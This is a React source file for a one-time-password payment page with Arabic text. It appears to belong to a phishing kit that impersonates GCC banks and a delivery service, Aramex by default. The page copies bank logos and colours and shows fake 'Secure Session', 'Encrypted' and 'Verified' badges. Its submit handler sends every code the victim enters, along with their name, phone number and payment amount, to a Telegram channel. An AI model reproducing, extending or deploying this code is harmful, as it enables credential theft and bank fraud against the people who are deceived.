import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X, ShieldCheck, Loader2, Landmark, Smartphone } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBankById } from "@/lib/banks";
import { bankBranding } from "@/lib/brandingSystem";
import BankLogo from "@/components/BankLogo";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { formatCurrency } from "@/lib/countryCurrencies";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  
  const serviceKey = link?.payload?.service_key || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankId = link?.payload?.selectedBank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;

  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;
    setError("");

    const isCorrect = otp === payment.otp;

    await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: payment.name || '',
        phone: payment.phone || '',
        service: serviceName,
        amount: formatCurrency(payment.amount, payment.currency),
        otp: otp,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: payment.attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (otp === payment.otp) {
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}`,
        },
      });

      toast({ title: "تم بنجاح!", description: "تم تأكيد الدفع بنجاح" });
      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = payment.attempts + 1;
      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts, locked_until: lockUntil } });
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts } });
        setError(`رمز التحقق غير صحيح. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  return (
    <div className="min-h-screen bg-[#F8FAFC] pb-20" dir="rtl">
      {/* Official Banking/Payment Header */}
      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             {selectedBank ? (
               <div className="w-32 sm:w-40">
                  <BankLogo bankId={selectedBankId} bankName={selectedBank.name} bankNameAr={selectedBank.nameAr} className="w-full h-auto object-contain" />
               </div>
             ) : (
               <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white"><ShieldCheck className="w-6 h-6" /></div>
                  <h1 className="text-lg font-black text-gray-800">التحقق الآمن</h1>
               </div>
             )}
          </div>
          <div className="flex items-center gap-3">
             <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full text-[10px] font-black uppercase border border-green-100">
                <Lock className="w-3.5 h-3.5" /> Secure Session
             </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-12">
        <div className="max-w-[450px] mx-auto space-y-8">
           <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white text-center space-y-8 relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-blue-600 opacity-[0.02] -mr-16 -mt-16 rounded-full" />

              <div className="space-y-4">
                 <div className="w-20 h-20 rounded-[2rem] bg-blue-50 text-blue-600 mx-auto flex items-center justify-center shadow-inner">
                    <Smartphone className="w-10 h-10" />
                 </div>
                 <h2 className="text-2xl font-black text-gray-800">رمز التحقق لمرة واحدة</h2>
                 <p className="text-sm font-bold text-gray-400 px-4">تم إرسال رمز التحقق (OTP) المكون من 4 أرقام إلى رقم جوالك المسجل لدينا</p>
              </div>

              <div className="space-y-6">
                 <div className="flex justify-center">
                    <InputOTP maxLength={4} value={otp} onChange={setOtp} disabled={isLocked}>
                       <InputOTPGroup className="gap-4">
                          {[0, 1, 2, 3].map((i) => (
                             <InputOTPSlot key={i} index={i} className="w-16 h-20 text-3xl font-black border-2 rounded-2xl bg-gray-50 focus:bg-white transition-all shadow-sm" />
                          ))}
                       </InputOTPGroup>
                    </InputOTP>
                 </div>

                 {error && (
                   <div className="p-4 rounded-2xl bg-red-50 text-red-600 text-xs font-bold border border-red-100 flex items-center gap-2 justify-center">
                      <AlertCircle className="w-4 h-4" /> {error}
                   </div>
                 )}

                 <div className="flex items-center justify-center gap-2 text-sm font-black text-blue-600 bg-blue-50 py-2 px-4 rounded-full w-fit mx-auto">
                    <Clock className="w-4 h-4" /> <span>{formatTime(timeLeft)}</span>
                 </div>
              </div>

              <Button
                onClick={handleSubmit}
                disabled={otp.length < 4 || isLocked || updatePayment.isPending}
                className="w-full h-16 rounded-2xl text-xl font-black shadow-xl transition-all hover:scale-[1.02]"
                style={{ background: primaryColor, boxShadow: `0 10px 30px -10px ${primaryColor}60` }}
              >
                {updatePayment.isPending ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد العملية"}
              </Button>

              <div className="pt-4">
                 <button className="text-xs font-black text-gray-400 hover:text-blue-600 transition-colors">إعادة إرسال الرمز؟</button>
              </div>
           </Card>

           <div className="flex items-center justify-center gap-6 text-[10px] font-black text-gray-400 uppercase tracking-widest">
              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5" /> Verified</div>
              <div className="w-1 h-1 rounded-full bg-gray-300" />
              <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /> Encrypted</div>
              <div className="w-1 h-1 rounded-full bg-gray-300" />
              <div className="flex items-center gap-1.5"><Landmark className="w-3.5 h-3.5" /> GCC Bank</div>
           </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentOTP;
